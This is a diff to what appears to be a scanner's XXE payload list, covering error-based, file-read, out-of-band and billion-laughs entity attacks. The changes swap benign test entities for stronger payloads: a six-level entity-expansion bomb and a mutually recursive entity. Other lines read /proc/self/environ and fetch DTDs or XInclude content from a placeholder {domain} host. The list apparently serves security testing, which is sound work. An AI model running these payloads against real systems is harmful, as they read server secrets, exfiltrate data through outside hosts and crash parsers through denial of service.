@@ -1,13 +1,11 @@
 ##XXE - Error-Based##
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "1337">]><root>&xxe;</root>
-<foo>1337</foo>
-<![CDATA[1337]]>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM>]><root/>
 ##XXE - File Read##
 <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>
 ##XXE - OOB##
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe.dtd">%xxe;]><root>1337</root>
 <hjk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://{domain}/xxe" parse="text"/></hjk>
 ##XXE - Billion Laughs (Timing/DoS)##
-<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "ABCDEFGHIJ"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">]><root>&lol6;</root>
 ##XXE - Error (recursive entity)##
-<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "1337">]><foo>&a;</foo>
+<!DOCTYPE foo [<!ENTITY a "&#x26;b;"><!ENTITY b "&#x26;a;">]><foo>&a;</foo>
